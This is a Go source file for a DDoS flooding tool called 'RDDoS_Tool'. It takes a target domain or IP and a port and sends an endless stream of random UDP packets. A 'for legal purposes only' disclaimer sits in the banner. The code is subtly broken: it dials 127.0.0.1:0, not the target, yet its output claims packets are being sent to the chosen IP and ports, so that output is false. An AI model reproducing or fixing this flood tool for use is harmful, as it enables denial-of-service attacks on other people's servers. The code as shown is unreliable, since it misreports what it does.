package main

import (
    "fmt"
    "math/rand"
    "net"
    "os"
    "os/exec"
    "time"
)

// Versi.
var version = "1.2"

// Platform info
func clearScreen() {
    uname := os.Getenv("OS")
    var cmd *exec.Cmd
    if uname == "Windows_NT" {
        cmd = exec.Command("cmd", "/c", "cls")
    } else {
        cmd = exec.Command("clear")
    }
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func main() {
    clearScreen()

    // Socket
    conn, err := net.Dial("udp", "127.0.0.1:0")
    if err != nil {
        fmt.Println(err)
        return
    }
    defer conn.Close()
    bytes := make([]byte, 1490)
    rand.Read(bytes)

    // RDDoS_Tool
    for {
        // UI
        fmt.Printf("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: %s\n", version)
        fmt.Println("\033[91m  (, /   )      /) (, /    ) (, /    )   (__/  )    (, /        /)")
        fmt.Println("\033[91m    /__ /  _  _/ /    /    /    /    / ___  /         /  ______// ")
        fmt.Println("\033[91m ) /   \\__(/_(_(_ _/___ /_  _/___ /_(_)) /      ) /  (_)(_)(_(/_")
        fmt.Println("\033[91m(_/\\033[0m              \033[95m(_/___ /  (_/___ /    (_/      (_/")

        fmt.Println("                        Author: Mr.\033[91mRed\033[0m")
        fmt.Println("       Github: https://github.com/Red-company/RDDoS_Tool")
        fmt.Println("                   For legal purposes only")
        fmt.Println("\033[92;1m")
        fmt.Println("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
        fmt.Println("\033[0m")

        // Input
        var opt string
        fmt.Print("\n> ")
        fmt.Scanln(&opt)

        var ip string

        // Selection
        switch opt {
        case "1":
            var domain string
            fmt.Print("Domain: ")
            fmt.Scanln(&domain)
            ips, err := net.LookupIP(domain)
            if err != nil {
                fmt.Println("Could not get IPs:", err)
            }
            ip = ips[0].String()
            break
        case "2":
            fmt.Print("IP Address: ")
            fmt.Scanln(&ip)
            break
        case "3":
            fmt.Println("\nEasy.       .سهل")
            fmt.Println("Open.      .افتح")
            fmt.Println("Secure.    .يؤمن")
            fmt.Println("RedDDoS Tool is an open-source tool for testing networks/servers.")
            fmt.Println("The author is not responsible for misuse. Use only for legitimate purposes.")
            fmt.Println("\nFor more information visit the project's site.")
            fmt.Println("\n\n\nPress Enter to continue.")
            fmt.Scanln()
            clearScreen()
        case "4":
            os.Exit(0)
        default:
            fmt.Println("\033[91mInvalid Choice!\033[0m")
            time.Sleep(2 * time.Second)
            clearScreen()
        }

        // Port selection
        portMode := false
        port := 2

        for {
            var portChoice string
            fmt.Print("Certain port? [y/n]: ")
            fmt.Scanln(&portChoice)

            if portChoice == "y" || portChoice == "Y" {
                portMode = true
                fmt.Print("Port: ")
                fmt.Scanln(&port)
                break
            } else if portChoice == "n" || portChoice == "N" {
                break
            } else {
                fmt.Println("\033[91mInvalid Choice!\033[0m")
                time.Sleep(2 * time.Second)
            }
        }

        clearScreen()
        fmt.Println("INITIALIZING....")
        time.Sleep(1 * time.Second)
        fmt.Println("STARTING...")
        time.Sleep(4 * time.Second)

        sent := 0

        if !portMode { // All ports
            for {
                if port == 65534 {
                    port = 1
                } else if port == 1900 {
                    port = 1901
                }

                _, err := conn.Write(bytes)
                if err != nil {
                    fmt.Println("Error sending:", err)
                }
                sent++
                port++
                fmt.Printf("Sent %d packets to %s through port: %d\n", sent, ip, port)
            }
        } else { // Certain port
            if port < 2 {
                port = 2
            } else if port == 65534 {
                port = 2
            } else if port == 1900 {
                port = 1901
            }

            for {
                _, err := conn.Write(bytes)
                if err != nil {
                    fmt.Println("Error sending:", err)
                }
                sent++
                fmt.Printf("Sent %d packets to %s through port: %d\n", sent, ip, port)
            }
        }
    }
}
